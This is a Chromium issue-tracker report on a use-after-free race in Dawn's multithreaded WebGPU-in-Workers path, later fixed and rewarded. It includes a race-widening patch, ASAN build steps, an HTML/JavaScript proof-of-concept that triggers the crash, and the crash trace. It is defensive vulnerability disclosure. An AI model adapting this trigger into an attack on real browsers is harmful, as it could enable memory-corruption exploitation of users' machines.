# Use-After-Free in WebGPU Worker Multithreaded Dawn Wire Path Leading to Potential Remote Code Execution

| Field | Value |
|-------|-------|
| **Issue ID** | [485935302](https://issues.chromium.org/issues/485935302) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Dawn |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | lo...@google.com |
| **Created** | 2026-02-20 |
| **Bounty** | $4,000.00 |

## Description

# Use-After-Free in WebGPU Worker Multithreaded Dawn Wire Path Leading to Potential Remote Code Execution

## Summary

A use-after-free vulnerability exists in Chromium's WebGPU implementation when using the experimental multithreaded Dawn wire feature in Web Workers. The vulnerability occurs due to a race condition between the IO thread executing error callbacks and the Worker thread processing device lost events. When a WebGPU device is destroyed while error callbacks are being processed, the error callback's userdata can be freed by the device lost handler on one thread while still being accessed by the error handler on another thread. This vulnerability could allow an attacker to achieve remote code execution in the renderer process by crafting malicious WebGPU operations within a Web Worker context.

## Bisect

The vulnerability was introduced when the WebGPUMultithreadDawnWireOnWorkers feature was added. This feature enables multithreaded Dawn wire processing for WebGPU in Web Workers, which created a new code path where HandleCommands runs on the IO thread while ProcessEvents runs on the Worker main thread without proper synchronization for the callback info structure.

Introducing Commit: `128493b77655a` ([webgpu][blink] Adds the capability to enable multithread GPU replies.)

- Date: 2025-12-22
- Author: Lokbondo Kung ([lokokung@google.com](mailto:lokokung@google.com))
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/7080760>

## Root Cause

The vulnerability stems from a lack of synchronization between two concurrent operations in the Dawn wire client when the WebGPUMultithreadDawnWireOnWorkers feature is enabled. The HandleCommands function executes on the IO thread while ProcessEvents executes on the Worker main thread, and these two functions can access the same callback information structure without proper locking.

When a WebGPU device encounters an error, the HandleError function in the Dawn wire client reads the uncaptured error callback info, including userdata pointers, and invokes the callback. The relevant code in Device.cpp shows this pattern:

```
// third_party/dawn/src/dawn/wire/client/Device.cpp
void Device::HandleError(WGPUErrorType errorType, WGPUStringView message) {
    if (mUncapturedErrorCallbackInfo.callback) {
        const auto device = ToAPI(this);
        mUncapturedErrorCallbackInfo.callback(&device, errorType, message,
                                              mUncapturedErrorCallbackInfo.userdata1,
                                              mUncapturedErrorCallbackInfo.userdata2);
    }
}

```

Concurrently, when a device is destroyed, the DeviceLostEvent::CompleteImpl function clears the callback info and invokes the device lost callback:

```
// third_party/dawn/src/dawn/wire/client/Device.cpp
void CompleteImpl(FutureID futureID, EventCompletionType completionType) override {
    // ...
    mDevice->mUncapturedErrorCallbackInfo = kEmptyUncapturedErrorCallbackInfo;
    // ...
    if (mCallback != nullptr) {
        mCallback(&device, mReason, ToOutputStringView(mMessage), userdata1, userdata2);
    }
}

```

The device lost callback ultimately invokes GPUDevice::OnDeviceLost in the Blink layer, which takes ownership of and subsequently destroys the error callback object:

```
// third_party/blink/renderer/modules/webgpu/gpu_device.cc
void GPUDevice::OnDeviceLost(
    std::unique_ptr<WGPURepeatingCallback<wgpu::UncapturedErrorCallback<void>>> error_callback,
    const wgpu::Device& device,
    wgpu::DeviceLostReason reason,
    wgpu::StringView message) {
  // When this function returns, error_callback is destroyed, freeing userdata
  // ...
}

```

The race condition occurs because HandleCommands, which calls HandleError, runs on the IO thread while ProcessEvents, which eventually calls OnDeviceLost, runs on the Worker main thread. The WebGPU implementation in webgpu\_implementation.cc shows this threading model:

```
// gpu/command_buffer/client/webgpu_implementation.cc
void WebGPUImplementation::HandleCommands(const volatile char* commands, size_t commands_count) {
    base::AutoLock lock(lock_);  // Holds lock on IO thread
    // ... calls HandleError
}

void DawnInstance::ProcessEvents() {
    // No lock! Runs on Worker main thread
    wgpuInstanceProcessEvents(instance_);
}

```

The critical issue is that after HandleCommands completes, it posts ProcessEvents as a task to the Worker main thread. If a subsequent HandleCommands call reads the callback userdata while a previously posted ProcessEvents is executing OnDeviceLost and freeing that same userdata, a use-after-free occurs.

## Reproduce

To reproduce this vulnerability, follow these steps in order.

Step 1: Apply the patch to Device.cpp. Navigate to the Chromium source directory and apply the following patch to third\_party/dawn/src/dawn/wire/client/Device.cpp. This patch widens the race window to make the vulnerability reliably reproducible. The original HandleError function invokes the callback synchronously, resulting in an extremely narrow race window that is difficult to trigger consistently. The patch copies the callback info to local variables and invokes the callback from a detached thread after a 50ms delay. This does not break functionality because the error callback is still invoked with identical parameters; it is simply deferred. The 50ms delay provides sufficient time for ProcessEvents on the Worker main thread to execute OnDeviceLost and free the userdata before the detached thread attempts to use it, converting a timing-dependent race condition into a deterministic use-after-free.

```
diff --git a/src/dawn/wire/client/Device.cpp b/src/dawn/wire/client/Device.cpp
index e6f1ef9ad9..4ab80dbae5 100644
--- a/src/dawn/wire/client/Device.cpp
+++ b/src/dawn/wire/client/Device.cpp
@@ -27,8 +27,11 @@

 #include "dawn/wire/client/Device.h"

+#include <atomic>
+#include <chrono>
 #include <memory>
 #include <string>
+#include <thread>
 #include <utility>

 #include "dawn/common/Assert.h"
@@ -347,11 +350,30 @@ void Device::SetFeatures(const WGPUFeatureName* features, uint32_t featuresCount
 }

 void Device::HandleError(WGPUErrorType errorType, WGPUStringView message) {
-    if (mUncapturedErrorCallbackInfo.callback) {
-        const auto device = ToAPI(this);
-        mUncapturedErrorCallbackInfo.callback(&device, errorType, message,
-                                              mUncapturedErrorCallbackInfo.userdata1,
-                                              mUncapturedErrorCallbackInfo.userdata2);
+    auto callbackCopy = mUncapturedErrorCallbackInfo;
+    if (callbackCopy.callback) {
+        static std::atomic<int> counter{0};
+        int id = ++counter;
+
+        auto callback = callbackCopy.callback;
+        auto userdata1 = callbackCopy.userdata1;
+        auto userdata2 = callbackCopy.userdata2;
+        auto devicePtr = ToAPI(this);
+        std::string msgCopy = ToString(message);
+
+        std::thread([callback, userdata1, userdata2, devicePtr, msgCopy, id, errorType]() {
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            WGPUStringView msg = {msgCopy.c_str(), msgCopy.size()};
+            callback(&devicePtr, errorType, msg, userdata1, userdata2);
+        }).detach();
     }
 }

```

Step 2: Build Chrome with AddressSanitizer. Configure the build with the following GN arguments in out/asan-release/args.gn:

```
is_asan = true
is_debug = false
dcheck_always_on = false
target_cpu = "x64"
is_component_build = true

```

Then build Chrome using autoninja:

```
autoninja -C out/asan-release chrome

```

Step 3: Create the PoC file. Save the following HTML file to the Chromium source directory as poc\_webgpu\_uaf.html:

```
<!DOCTYPE html>
<html>
<head>
<title>WebGPU Worker UAF PoC</title>
</head>
<body>
<h2>WebGPU Worker UAF PoC</h2>
<pre id="log"></pre>
<script>
const logEl = document.getElementById('log');
function log(msg) {
    logEl.textContent += msg + '\n';
    console.log(msg);
}

const workerCode = `
let adapter = null;

async function init() {
    if (!navigator.gpu) throw new Error('No WebGPU');
    adapter = await navigator.gpu.requestAdapter();
    if (!adapter) throw new Error('No adapter');
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function triggerUAF() {
    await init();
    self.postMessage('Starting UAF trigger');

    const startTime = Date.now();
    let cycles = 0;

    while (Date.now() - startTime < 120000) {
        try {
            const device = await adapter.requestDevice();
            device.onuncapturederror = (event) => {};

            const buffer = device.createBuffer({
                size: 64,
                usage: GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST
            });

            for (let i = 0; i < 3; i++) {
                try {
                    const encoder = device.createCommandEncoder();
                    encoder.copyBufferToBuffer(buffer, 9999, buffer, 0, 32);
                    device.queue.submit([encoder.finish()]);
                } catch(e) {}
            }

            await sleep(0);
            device.destroy();

            for (let i = 0; i < 10; i++) {
                try {
                    const encoder = device.createCommandEncoder();
                    encoder.copyBufferToBuffer(buffer, 9999, buffer, 0, 32);
                    device.queue.submit([encoder.finish()]);
                } catch(e) {}

                try {
                    device.createBuffer({
                        size: 64,
                        usage: GPUBufferUsage.COPY_SRC
                    });
                } catch(e) {}
            }

            await sleep(0);
            cycles++;

            if (cycles % 50 === 0) {
                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                self.postMessage('Cycles: ' + cycles + ', Time: ' + elapsed + 's');
            }
        } catch(e) {
            try {
                adapter = await navigator.gpu.requestAdapter();
            } catch(e2) {}
            await sleep(5);
        }
    }

    self.postMessage('Complete: ' + cycles + ' cycles');
}

self.onmessage = async () => {
    try {
        await triggerUAF();
    } catch (e) {
        self.postMessage('Error: ' + e);
    }
};

self.postMessage('ready');
`;

async function main() {
    log('Creating Worker...');
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));

    worker.onmessage = (e) => {
        if (e.data === 'ready') {
            log('Worker ready, starting UAF trigger...');
            worker.postMessage('start');
        } else {
            log(e.data);
        }
    };

    worker.onerror = (e) => log('Worker error: ' + e.message);
}

if (navigator.gpu) {
    navigator.gpu.requestAdapter().then(a => {
        if (a) { log('WebGPU OK'); main(); }
        else log('No adapter');
    });
} else {
    log('WebGPU not available');
}
</script>
</body>
</html>

```

Step 4: Run the PoC. Execute the following commands from the Chromium source directory. The ASAN\_OPTIONS environment variable disables ODR violation detection which can produce false positives during Chrome startup.

```
export ASAN_OPTIONS="detect_odr_violation=0"
./out/asan-release/chrome \
    --no-sandbox \
    --enable-unsafe-webgpu \
    --enable-blink-features=WebGPUMultithreadDawnWireOnWorkers \
    --user-data-dir=/tmp/webgpu_test \
    --disable-extensions \
    --disable-component-update \
    --disable-background-networking \
    --disable-sync \
    --no-first-run \
    "file://$(pwd)/poc_webgpu_uaf.html"

```

The PoC will run for up to 2 minutes, continuously creating WebGPU devices, generating errors, destroying devices, and attempting to trigger errors on the destroyed device. Within seconds to minutes, the use-after-free should be detected by AddressSanitizer.

Step 5: Verify the crash. The AddressSanitizer output confirms the use-after-free with a message similar to the following:

```
==984060==ERROR: AddressSanitizer: heap-use-after-free on address 0x7c07a303e170 at pc 0x7fe7b9a7c033 bp 0x7be22ddc7970 sp 0x7be22ddc7968
READ of size 8 at 0x7c07a303e170 thread T11
    #0 0x7fe7b9a7c032 in base::RepeatingCallback<void (wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView)>::Run(wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView) const & base/memory/scoped_refptr.h:319:43
    #1 0x7fe7b9a7c2ad in void wgpu::dawn::wire::client::DeviceDescriptor::SetUncapturedErrorCallback<void (*)(wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView, void*), void*, void (wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView, void*), void>(void (*)(wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView, void*), void*)::'lambda'(WGPUDeviceImpl* const*, WGPUErrorType, WGPUStringView, void*, void*)::__invoke(WGPUDeviceImpl* const*, WGPUErrorType, WGPUStringView, void*, void*) gen/third_party/dawn/include/dawn/wire/client/webgpu_cpp.h:8440:9
    #2 0x7fe7a9d8fe87 in dawn::wire::client::Device::HandleError(WGPUErrorType, WGPUStringView)::$_0::operator()() const third_party/dawn/src/dawn/wire/client/Device.cpp:383:13
    #3 0x7fe7a9d8fa60 in void* std::__Cr::__thread_proxy<std::__Cr::tuple<std::__Cr::unique_ptr<std::__Cr::__thread_struct, std::__Cr::default_delete<std::__Cr::__thread_struct>>, dawn::wire::client::Device::HandleError(WGPUErrorType, WGPUStringView)::$_0>>(void*) gen/third_party/libc++/src/include/__type_traits/invoke.h:90:27
    #4 0x5611da5130f6 in asan_thread_start(void*) asan_interceptors.cpp

0x7c07a303e170 is located 0 bytes inside of 8-byte region [0x7c07a303e170,0x7c07a303e178)
freed by thread T10 (DedicatedWorker) here:
    #0 0x5611da54fbb2 in operator delete(void*, unsigned long) (/home/test/chromium/src/out/asan-release/chrome+0x6825bb2) (BuildId: 47eda46dea50c1e4)
    #1 0x7fe7b9a605e0 in blink::GPUDevice::OnDeviceLost(std::__Cr::unique_ptr<gpu::webgpu::WGPURepeatingCallback<void (wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView)>, std::__Cr::default_delete<gpu::webgpu::WGPURepeatingCallback<void (wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView)>>>, wgpu::dawn::wire::client::Device const&, wgpu::DeviceLostReason, wgpu::dawn::wire::client::StringView) gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #2 0x7fe7b9a6ee00 in base::internal::Invoker<...>::RunOnce(...) base/functional/bind_internal.h:740:12
    #3 0x7fe7b9a7c4a2 in gpu::webgpu::WGPUOnceCallback<...>::CallUnboundOnceCallback(...) base/functional/callback.h:155:12
    #4 0x7fe7b9a7c7cd in void wgpu::dawn::wire::client::DeviceDescriptor::SetDeviceLostCallback<...>::__invoke(...) gen/third_party/dawn/include/dawn/wire/client/webgpu_cpp.h:8395:9
    #5 0x7fe7a9d8ec07 in dawn::wire::client::Device::DeviceLostEvent::CompleteImpl(unsigned long, dawn::EventCompletionType) third_party/dawn/src/dawn/wire/client/Device.cpp:214:13
    #6 0x7fe7a9d98f5f in void std::__Cr::__call_once_proxy<...>(void*) third_party/dawn/src/dawn/wire/client/EventManager.cpp:84:9
    #7 0x7fe7b1530bb7 in std::__Cr::__call_once(...) third_party/libc++/src/src/call_once.cpp:58:5
    #8 0x7fe7a9d95198 in dawn::wire::client::EventManager::ProcessPollEvents() gen/third_party/libc++/src/include/__mutex/once_flag.h:135:5
    #9 0x7fe7d4979b44 in base::internal::Invoker<...>::RunOnce(...) base/functional/bind_internal.h:740:12
    #10 0x7fe821560c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #11 0x7fe8215e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #12 0x7fe8215e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #13 0x7fe8214033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #14 0x7fe8215e37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #15 0x7fe8214cb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #16 0x7fe7c6e6be8c in blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run() third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:178:14
    #17 0x7fe8216dde8c in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #18 0x5611da5130f6 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T10 (DedicatedWorker) here:
    #0 0x5611da54efad in operator new(unsigned long) (/home/test/chromium/src/out/asan-release/chrome+0x6824fad) (BuildId: 47eda46dea50c1e4)
    #1 0x7fe7b9a69709 in blink::GPUDevice::SetDescriptorCallbacks(wgpu::dawn::wire::client::DeviceDescriptor&) gpu/webgpu/callback.h:141:10
    #2 0x7fe7b9a2385b in blink::GPUAdapter::requestDevice(blink::ScriptState*, blink::GPUDeviceDescriptor*) third_party/blink/renderer/modules/webgpu/gpu_adapter.cc:313:11
    #3 0x7fe7b74158eb in blink::(anonymous namespace)::v8_gpu_adapter::RequestDeviceOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/modules/v8/v8_gpu_adapter.cc:168:39

Thread T11 created by T5 (Chrome_ChildIOT) here:
    #0 0x5611da4f8eb1 in pthread_create (/home/test/chromium/src/out/asan-release/chrome+0x67ceeb1) (BuildId: 47eda46dea50c1e4)
    #1 0x7fe7a9d8ab1e in dawn::wire::client::Device::HandleError(WGPUErrorType, WGPUStringView) gen/third_party/libc++/src/include/__thread/support/pthread.h:182:10
    #2 0x7fe7a9d88df9 in dawn::wire::client::Client::DoDeviceUncapturedErrorCallback(dawn::wire::client::Device*, WGPUErrorType, WGPUStringView) third_party/dawn/src/dawn/wire/client/ClientDoers.cpp:53:13
    #3 0x7fe7a9d48084 in dawn::wire::client::Client::HandleDeviceUncapturedErrorCallback(dawn::wire::DeserializeBuffer*) gen/third_party/dawn/src/dawn/wire/client/ClientHandlers_autogen.cpp:72:16
    #4 0x7fe7a9d48617 in dawn::wire::client::Client::HandleCommands(char const volatile*, unsigned long) gen/third_party/dawn/src/dawn/wire/client/ClientHandlers_autogen.cpp:129:30
    #5 0x7fe7d496ddfb in gpu::webgpu::DawnWireServices::HandleCommands(gpu::webgpu::cmds::DawnReturnCommandsInfo const&, unsigned long) gpu/command_buffer/client/webgpu_implementation.cc:89:22
    #6 0x7fe7d4970b7d in gpu::webgpu::WebGPUImplementation::OnGpuControlReturnData(base::span<unsigned char const, 18446744073709551615ul, unsigned char const*>) gpu/command_buffer/client/webgpu_implementation.cc:338:19

SUMMARY: AddressSanitizer: heap-use-after-free base/memory/scoped_refptr.h:319:43 in base::RepeatingCallback<void (wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView)>::Run(wgpu::dawn::wire::client::Device const&, wgpu::ErrorType, wgpu::dawn::wire::client::StringView) const &

```

The ASAN output demonstrates that the memory at address 0x7c07a303e170 was read by thread T11 after being freed by thread T10. The memory was originally allocated during GPUDevice::SetDescriptorCallbacks when creating the WebGPU device, was freed during GPUDevice::OnDeviceLost when processing the device lost event, and was subsequently accessed when the error callback attempted to use the freed userdata pointer. This confirms the race condition between the IO thread handling errors and the Worker thread processing device lost events.

## Timeline

### an...@chromium.org (2026-02-20)

[security shepherd] setting foundin based on bisect. lokokung@ can you PTAL?

### an...@chromium.org (2026-02-20)

Also, since WebGPUMultithreadDawnWireOnWorkers seems to be an experimental feature, does that mean users have to explicitly opt in? Should this bug be marked as Security Impact None?

### lo...@google.com (2026-02-20)

Yea, the feature is experimental, users need to explicitly specify the flag to opt-in so it shouldn't currently have a security impact.

### an...@chromium.org (2026-02-20)

Thanks for confirming, I have marked this as Security\_Impact-None.

### dx...@google.com (2026-02-27)

Project: dawn  

Branch:  main  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/293415>

[dawn][wire] Make unconditionally spontaneous callbacks thread safe.

---


Expand for full commit details
```
     
    - The logging and uncaptured error callbacks are always spontaneous so 
      if a thread is calling device lost while one of those trigger on 
      another thread, we could end up racing, especially in a case where 
      the device lost callback actually owns or cleans up the logging or 
      uncaptured error callbacks. This change adds a lock to synchronize 
      access to the callbacks, and uses a semaphore value to avoid holding 
      the lock while calling the callbacks which could result in 
      re-entrancy issues. 
    - Some minor cleanups as well to use std::call_once in some places and 
      use a std::variant to make it clear that the device lost is either 
      an event (for lazy event tracking) or the future id of said tracked 
      event. 
     
    Bug: 485935302 
    Change-Id: I3ce7763bf4cd5cc63211b103687e8ab5e4043023 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/293415 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Loko Kung <lokokung@google.com>

```

---

Files:

- M `src/dawn/wire/client/Device.cpp`
- M `src/dawn/wire/client/Device.h`

---

Hash: eb1e8f4962feaece7a13d6c163f1233348e630dc  

Date: Fri Feb 27 00:09:25 2026


---

### dx...@google.com (2026-02-27)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7616095>

Roll Dawn from 962fc5f5e4d8 to d5692ff2fb57 (7 revisions)

---


Expand for full commit details
```
     
    https://dawn.googlesource.com/dawn.git/+log/962fc5f5e4d8..d5692ff2fb57 
     
    2026-02-27 kainino@chromium.org [dawn][metal] ArgBufs: fix dynamic offsets buffer index matching 
    2026-02-27 bsheedy@google.com Fix Mac/x64 additional compile targets 
    2026-02-27 kainino@chromium.org [tint][msl] ArgBufs: fix pointer_offset() for device address space 
    2026-02-27 dawn-automated-expectations@chops-service-accounts.iam.gserviceaccount.com Roll third_party/webgpu-cts/ 3a8f51b73..21ecca5d7 (4 commits) 
    2026-02-27 lokokung@google.com [dawn][wire] Make unconditionally spontaneous callbacks thread safe. 
    2026-02-26 cwallez@chromium.org Roll third_party/webgpu-headers/src/ 0bfcdc4f4..b2b04dde3 (6 commits) 
    2026-02-26 bsheedy@google.com Remove Win/arm64 infra/specs entries 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/dawn-chromium-autoroll 
    Please CC cwallez@google.com,shrekshao@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:dawn-android-arm-deps-rel;luci.chromium.try:dawn-android-arm64-deps-rel;luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-mac-arm64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel;luci.chromium.try:dawn-win11-arm64-deps-rel;luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-android-arm64 
    Bug: chromium:363031535,chromium:485816035,chromium:485935302 
    Tbr: shrekshao@google.com 
    Test: Test: BindGroupTests.DrawThenChangePipelineAndBindGroup 
    Test: Test: BindGroupTests.DynamicOffsetOrder 
    Test: Test: BindGroupTests.DynamicOffsetsWithAtomicOperations 
    Change-Id: Ia1cc159f6106f1a07d0f5d8a937e717901d1cb4b 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7616095 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1591304}

```

---

Files:

- M `DEPS`
- M `third_party/dawn`

---

Hash: [51770f9a1526ec1df6e6cc334fc9ec706c6879f9](https://chromiumdash.appspot.com/commit/51770f9a1526ec1df6e6cc334fc9ec706c6879f9)  

Date: Fri Feb 27 03:49:15 2026


---

### lo...@google.com (2026-03-13)

This Dawn CL needs to be backmerged: <https://dawn-review.googlesource.com/293415>

### dr...@chromium.org (2026-03-15)

Looks like the [roll](https://crrev.com/c/7616095) is already in M147, so we don't need a merge there. No crashes in Canary, so approving a merge to M146.

### lo...@google.com (2026-03-19)

It seems like there was a merge conflict for the change, so I am now also asking to merge these two dependent changes back to M146 as well:

<https://dawn-review.googlesource.com/c/dawn/+/290375>

<https://dawn-review.googlesource.com/c/dawn/+/292896>

### dr...@chromium.org (2026-03-19)

Still approved for M146. Feel free to merge all three.

### ch...@google.com (2026-03-20)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-20)

Project: dawn  

Branch:  chromium/7680  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/297516>

[M146] [dawn][wire] Make unconditionally spontaneous callbacks thread safe.

---


Expand for full commit details
```
     
    - The logging and uncaptured error callbacks are always spontaneous so 
      if a thread is calling device lost while one of those trigger on 
      another thread, we could end up racing, especially in a case where 
      the device lost callback actually owns or cleans up the logging or 
      uncaptured error callbacks. This change adds a lock to synchronize 
      access to the callbacks, and uses a semaphore value to avoid holding 
      the lock while calling the callbacks which could result in 
      re-entrancy issues. 
    - Some minor cleanups as well to use std::call_once in some places and 
      use a std::variant to make it clear that the device lost is either 
      an event (for lazy event tracking) or the future id of said tracked 
      event. 
     
    Bug: 485935302 
    Change-Id: I3ce7763bf4cd5cc63211b103687e8ab5e4043023 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/293415 
    Reviewed-by: Kai Ninomiya <kainino@chromium.org> 
    Commit-Queue: Loko Kung <lokokung@google.com> 
    (cherry picked from commit eb1e8f4962feaece7a13d6c163f1233348e630dc) 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/297516

```

---

Files:

- M `src/dawn/wire/client/Device.cpp`
- M `src/dawn/wire/client/Device.h`

---

Hash: 6527d3fd406acc71ab6172095e36fe6bb71f6ae8  

Date: Fri Mar 20 18:43:43 2026


---

### sp...@google.com (2026-03-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $4000.00 for this report.

Rationale for this decision:
Baseline. Mildly mitigated (sandboxed/gpu) 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-06)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485935302)*
